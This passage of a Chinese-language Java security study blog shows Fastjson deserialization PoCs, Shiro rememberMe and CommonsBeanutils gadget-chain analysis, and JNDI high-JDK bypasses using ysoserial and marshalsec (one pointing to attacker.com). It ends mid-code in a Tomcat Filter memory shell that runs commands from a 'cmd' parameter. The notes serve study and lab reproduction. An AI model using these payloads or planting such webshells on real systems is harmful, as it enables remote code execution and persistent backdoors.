class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br>        String poc=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://172.31.80.1:1389/fjfljn\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(poc);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>成功弹出计算器！！！</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A132.png"></p></li><li><p>反序列化原理分析</p><ul><li><p>传入其他类解析时会调用  getdataSourceName，setdataSourceName，</p><pre><code class="hljs">                                         getautoCommit，setautoCommit方法</code></pre></li><li><p>调用setAutoCommit方法时调用了 connect方法，connect方法中调用了lookup()方法</p><p>控制注入核心触发代码</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A133.png"></p></li><li><p>分析过程</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A134.png"></p></li></ul></li></ul><h5 id="1-2-25版本"><a href="#1-2-25版本" class="headerlink" title="1.2.25版本"></a>1.2.25版本</h5><ul><li><p>发现原来的poc无法执行</p></li><li><p>定位到<code>checkAutoType()</code>方法，看一下它的逻辑：如果开启了<code>autoType</code>，那么就先判断类名在不在白名单中，如果在就用<code>TypeUtils.loadClass</code>加载，如果不在就去匹配黑名单：</p><p>jndi注入需要的类名在黑名单中，autoType默认关闭，无法使用原poc</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm7ZibH49F3GjQpYAic5fibnLPIPibNDVZ3Zq8iaeA6uxPbqOxqcd536j9ztw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1"></p></li><li><p>在demo controller中添加一行代码，开启AutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>在原poc包名前加上L，后面加;</p><p>即可弹出计算器</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A135.png"></p></li><li><p>发掘两步骤的原因</p><ul><li><p>前加L，后加；，用于绕过黑名单，后续有方法去除L与；</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A136.png"></p></li><li><p>开启autoType</p><p>断点调试后发现，如果不开启autoType，不会匹配白名单，会直接爆出autoType is not support</p><p>后续代码都全部显示异常</p></li></ul></li></ul><h5 id="1-2-25-1-2-47通杀poc"><a href="#1-2-25-1-2-47通杀poc" class="headerlink" title="1.2.25-1.2.47通杀poc"></a>1.2.25-1.2.47通杀poc</h5><ul><li><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;a&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="hljs-string">&quot;b&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1/exp&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></td></tr></table></figure></li><li><p>测试发现能正常弹出计算器</p></li><li><p>利用步骤</p><ul><li>利用java.lang.Class将恶意类加载到mappings中</li><li>从mappings中取出恶意代码并绕过黑名单进行反序列化</li></ul></li></ul><h3 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h3><ul><li><p>shiro反序列化链分析(获取用户请求)</p><ul><li>获取cookie中rememberMe的值</li><li>对remember进行Base64解码</li><li>使用AES解密</li><li>对解密的值进行反序列化</li></ul><p>550：Shiro-550 漏洞主要是由于 Shiro 的 <em>rememberMe</em> 内容反序列化导致的命令执行漏洞。其原因是默认加密密钥硬编码在 Shiro 源码中，攻击者可以创建一个恶意对象，对其进行序列化、编码，然后将其作为 cookie 的 rememberMe 字段内容发送，Shiro 将对其解码和反序列化，导致服务器运行恶意代码。</p><p>721：Shiro-721 漏洞利用了 AES-128-CBC 加密模式的 Padding Oracle Attack。攻击者可以通过 Padding Oracle 加密生成的攻击代码来构造恶意的 rememberMe 字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</p></li></ul><h4 id="漏洞环境搭建以及利用链分析"><a href="#漏洞环境搭建以及利用链分析" class="headerlink" title="漏洞环境搭建以及利用链分析"></a>漏洞环境搭建以及利用链分析</h4><h5 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h5><p><a href="https://www.cnblogs.com/nice0e3/p/14183173.html">Java安全之Shiro 550反序列化漏洞分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p><ul><li><p>给jstl加上版本为1.2</p></li><li><p>tomcat部署工件</p></li><li><p>访问url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1:8089/samples_web_war/login.jsp<br></code></pre></td></tr></table></figure></li><li><p>登录时抓取数据包</p></li><li><p>在返回包中找到cookie关键字为rememberMe</p></li><li><p>通过关键字爆破密钥并检测</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A137.png"></p></li><li><p>漏洞分析</p></li><li><p>在DefaultSecurityManager类的rememberMeSuccessfulLogin方法处下断点</p><p>目的：</p><ul><li>shiro登陆操作执行逻辑</li><li>反序列化漏洞的产生</li><li>利用条件</li></ul></li><li><p>追踪函数后发现</p><ul><li><p>加密：序列化-&gt;aes加密-&gt;base64加密-&gt;存入cookie</p></li><li><p>接受序列化数据解密</p><p>接受解密：base64解码-&gt;aes解密-&gt;反序列化</p></li></ul></li><li><p>调试时发现的AES加密密钥</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A138.png"></p><p>key数组可利用python脚本还原为原密钥字符串</p></li><li><p>shiro反序列化无法利用fastjson的利用链</p><ul><li><p>原因</p><ul><li><p>fastjson利用方法：调用JdbcRowSetImpl类，通过set，get方法触发lookup方法传参(反序列化自定义方法)，远程调用脚本</p></li><li><p>shiro反序列化：利用原生反序列化函数：readObject  writeObject  ObjectInputStream(漏洞点)</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A139.png"></p></li><li><p>shiro可能有JdbcRowSetImpl类，不满足触发set，get条件</p></li></ul></li></ul></li><li><p>利用工具使用利用链执行命令，成功弹出计算器</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A140.png"></p></li></ul><h4 id="cc利用链分析"><a href="#cc利用链分析" class="headerlink" title="cc利用链分析"></a>cc利用链分析</h4><ul><li><p>CC链，全称为CommonsCollections链，是指在Java反序列化漏洞中利用Apache Commons Collections库中的特定类和方法，构造出一条可以执行任意代码的调用链。CC链的核心在于利用反射机制，通过一系列的类和方法调用，最终达到执行恶意代码的目的。</p></li><li><p>攻击链的选取与框架加载的外部库有关，外部库中存在原生的漏洞</p></li><li><p>CB链分析：<a href="https://www.freebuf.com/articles/web/319397.html">关于我学渗透的那档子事之Java反序列化-CB链 - FreeBuf网络安全行业门户</a></p></li><li><p>知识要点</p><ul><li><p>入口点：触发反序列化的重写readObject方法</p></li><li><p>getProperty()方法</p><p>CB里面的类方法  对对象的一个方法进行调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PropertyUtils.getProperty(new Person(),&quot;name&quot;);</span><br><span class="hljs-comment">//自动调用Person对象里面的getName方法</span><br>PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>(),<span class="hljs-string">&quot;outputProperties&quot;</span>)<br><span class="hljs-comment">//自动调用TemplatesImpl对象里面的getOutputProperties方法</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>漏洞复现及CB链分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将利用链分为三部分</span><br><br>TemplatesImpt类-&gt;调用恶意类<br><br>BeanComparator类-&gt;利用javabean调用getOutputProperties()<br><br>PriorityQueue类-&gt;反射调用PropertyUtils.getPropert<br></code></pre></td></tr></table></figure><ul><li><p>入口点</p><p>PriorityQueue #readObject -&gt; heapify() -&gt; siftDown -&gt; siftDownUsingComparator -&gt; comparator.compare</p><p>-&gt; BeanComparator.compare</p><p>BeanComparator.compare会执行PropertyUtils.getProperty</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o1, <span class="hljs-built_in">this</span>.property);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o2, <span class="hljs-built_in">this</span>.property);<br><br>o1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>()<br>property=outputProperties<br>会自动调用TemplatesImpl#getOutputProperties方法<br></code></pre></td></tr></table></figure><p>条件</p><ul><li>size &gt;&#x3D;2</li><li>comparator !&#x3D; null</li><li>property  !&#x3D;  null</li></ul><p>TemplatesImpl 链，属于CC链分析  RCE</p><p>-&gt;  TemplatesImpl #getOutputProperties</p><p>-&gt;  newTransformer()</p><p>-&gt;  TransformerImpl(getTransletInstance())</p><p>-&gt;  defineTransletClasses()</p><p>-&gt;  loader.defineClass(执行命令)</p><p>条件：</p><p>_name !&#x3D;null</p><p>_class   !&#x3D;null</p><p>_bytecodes !&#x3D; null (命令参数)</p></li></ul></li><li><p>loader.defineClass</p><p><code>ClassLoader.defineClass</code> 是 <code>ClassLoader</code> 的一个受保护方法，它允许将字节数组转换为 Java 类。攻击者可借助它加载任意恶意类（即“内存马”或包含命令执行的类）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = loader.defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);<br></code></pre></td></tr></table></figure><p>这样，<code>classBytes</code> 中的字节码就会被定义为类并加载进 JVM，随之可能执行静态代码块或构造方法中携带的恶意逻辑。</p><p><code>defineClass</code> 本身不执行命令，它只是<strong>将字节码加载为类</strong>。真正执行命令的行为，通常发生在：</p><ul><li>类的<strong>静态代码块</strong>；</li><li>类的<strong>构造方法</strong>；</li><li>类的方法中，被随后立即调用。</li></ul><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一旦被加载（通过 <code>defineClass</code>），这个类的静态代码块就会立即执行，造成命令执行。</p></li><li><p>反序列化简化流程图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">反序列化入口<br>     ↓<br>CC利用链触发（TemplatesImpl、InvokerTransformer 等）<br>     ↓<br>调用 defineClass(classBytes)<br>     ↓<br>加载恶意类<br>     ↓<br>静态块/构造器执行<br>     ↓<br>命令执行（如 Runtime.getRuntime().<span class="hljs-built_in">exec</span>）<br></code></pre></td></tr></table></figure></li><li><p>反序列化构造cc链能够命令执行的核心</p><ol><li><code>TemplatesImpl.getOutputProperties()</code> 会触发内部 <code>defineTransletClasses()</code>；</li><li>这个方法调用了 <code>defineClass()</code>，加载了我们注入的恶意类；</li><li>恶意类的 <strong>静态代码块</strong> 被立即执行 → <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>；</li></ol></li></ul><h3 id="JNDI注入及其高版本绕过"><a href="#JNDI注入及其高版本绕过" class="headerlink" title="JNDI注入及其高版本绕过"></a>JNDI注入及其高版本绕过</h3><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 (tttang.com)</a></p><ul><li><p>JNDI注入触发的三个模式</p><ol><li>远程引用模式(基于JDK版本)</li><li>本地引用模式(基于依赖Jar)</li><li>反序列化模式(基于gadget链)</li></ol></li><li><p>jndi注入的版本限制</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A141.png"></p><p>高版本无法注入的原因：</p><ul><li><p>com.sun.jndi.rmi.object.trustURLCodebase，</p><p>com.sun.jndi.cosnaming.object.trustURLCodebase的默认值变为false，即不允许从远程的Codebase加载Reference工厂类，没限制加载本地文件</p></li></ul></li><li><p>高版本绕过方法</p><ul><li><p>利用jar包</p><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 (tttang.com)</a></p><p>白盒审计时查看引入了什么依赖，根据引入的依赖利用本地jar包，进行jndi注入</p></li><li><p>利用反序列化链(同样需要依赖包)</p><p><a href="https://blog.csdn.net/mole_exp/article/details/121141042">JNDI注入利用原理及绕过高版本JDK限制_jndi注入的限制-CSDN博客</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15946406.html#3-%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E6%B5%81%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce">java高版本下各种JNDI Bypass方法复现 - bitterz - 博客园 (cnblogs.com)</a></p><p>原理：</p><p>即使：</p><ul><li>远程类加载被禁用了（禁止 <code>http://...</code> 类加载）</li><li><code>trustURLCodebase=false</code></li></ul><p>只要 <strong>Java 会尝试读取对象并反序列化</strong>（如通过 <code>ObjectInputStream</code>），攻击者就可以在返回中嵌入<strong>序列化 Gadget 链对象</strong>，并在目标中激活它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span class="hljs-string">&quot;calc&quot;</span> &gt; poc.txt<br><span class="hljs-built_in">cat</span> poc.txt|base64.txt(替换换行符)<br>ldap://127.0.0.1:6666/exp<br><br><span class="hljs-comment">#需要依赖包</span><br>&lt;groupId&gt;commoms-collections&lt;/groupId&gt;<br>&lt;artifactId&gt;commons-conllections&lt;/artfactId&gt;<br></code></pre></td></tr></table></figure><p>在 Java 8u191+ 等高版本中，虽然远程类加载被禁用了（<code>trustURLCodebase=false</code>），<strong>但如果目标系统中已经存在可用的 Gadget 链（利用链）类，就可能通过 JNDI 注入触发反序列化，从而执行任意命令</strong>。</p><p> 绕过思路：利用已有 Gadget 链</p><p> 条件</p><ol><li><strong>JNDI 注入点存在</strong>（如 Log4j、Tomcat 配置等）</li><li><strong>目标服务器已有可利用的类</strong>（如 commons-collections、Groovy、Spring 组件等）</li><li><strong>支持 LDAP 或 RMI 绑定 Object 实例</strong>（不是远程类加载，而是对象反序列化）</li></ol><p>绕过方式技术细节</p><p>1.使用 LDAP 服务返回 <strong>序列化对象（不是类引用）</strong></p><p>攻击者搭建恶意 LDAP 服务器，当目标发起 JNDI 查询时，返回一个已经构造好的 Java 序列化对象（Object），而不是远程类的 URL。</p><p> <strong>即不需要 trustURLCodebase &#x3D; true</strong>，而是利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference → Referenceable → 特定 Gadget 链的序列化对象<br></code></pre></td></tr></table></figure><ol start="2"><li>构造 Gadget 链（利用 ysoserial 工具）</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&#x27;calc&#x27;</span> &gt; payload.ser<br></code></pre></td></tr></table></figure><p>使用 <code>marshalsec</code> 项目中的 LDAPServer 模拟 LDAP 服务，返回这个对象。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://attacker.com/#Exploit&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><ul><li><p>web代码执行流程</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A142.png"></p></li><li><p>servlet层触发的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//有请求必触发的方法</span><br>requestInitialized<br>requestDestroyed    <br></code></pre></td></tr></table></figure></li><li><p>内存马的类型</p><ol><li>Listener内存马：监听特定事件并执行恶意代码。</li><li>Filter内存马：拦截和修改HTTP请求和响应。</li><li>Servlet内存马：直接处理HTTP请求并执行恶意命令。</li></ol><p><img src="https://.3001.net//s/20221209/1670591008_63933220d0b7298b0fb3f.png!small"></p></li></ul><h4 id="Listen中内存马"><a href="#Listen中内存马" class="headerlink" title="Listen中内存马"></a>Listen中内存马</h4><ul><li><p>原理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">监听器指向class: com.example.listenshell.Test<br><br>applicationListeners=com.example.listenshell.Test<br>StanderContext#contxet-&gt;ApplicationContext#context<br><br>项目启动 listen在运行时  class来源是怎么获取的<br>StandardContext#addApplicationEventListener<br>内存:添加一个listen <br><br>Servlet -&gt; ApplicationContext -&gt; StandardContext<br></code></pre></td></tr></table></figure></li></ul><h4 id="Filter中内存马"><a href="#Filter中内存马" class="headerlink" title="Filter中内存马"></a>Filter中内存马</h4><ul><li><p>filter类中的方法</p><ul><li>init–初始化</li><li>doFilter – 执行点</li><li>destory –  销毁</li></ul></li><li><p>filter访问流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Servlet -&gt; context-&gt;ApplicationFilterConfig-&gt;context-&gt;StandardContext-&gt;filterConfigs<br><br>ApplicationFilterConfig#filterConfig context -&gt; StandardContext#<br><br>filterConfigs<br>filterDefs#  配置名称和class<br>filterMaps   配置名称url路由<br><br>ApplicationFilterConfig#filterConfig( filterDef(filterClass filterName))<br><br>addFilterDef  添加配置名称和class<br>addFilterMap  addFilterMapBefore  添加配置名称和url路由<br></code></pre></td></tr></table></figure></li><li><p>内存马实现</p><p>– 相当于添加一个Filter</p><ol><li>Servlet获取用户访问</li><li>判断触发(是否为null)</li><li>如未触发则添加Filter</li><li>向对象成员中添加配置信息</li></ol></li><li><p>Filter内存马编写</p><p><a href="https://zhuanlan.zhihu.com/p/404057893">【安全记录】通过jsp文件注入内存马 - 知乎 (zhihu.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> pres.test.momenshell;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddTomcatFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.doPost(req, resp);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;RoboTerh&quot;</span>;<br>            <span class="hljs-comment">//从request中获取ServletContext</span><br>            <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> req.getSession().getServletContext();<br><br>            <span class="hljs-comment">//从context中获取ApplicationContext对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            appctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>            <span class="hljs-comment">//从ApplicationContext中获取StandardContext对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>            <span class="hljs-comment">//从StandardContext中获得filterConfigs这个map对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>            <span class="hljs-comment">//如果这个过滤器名字没有注册过</span><br>            <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//自定义一个Filter对象</span><br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span 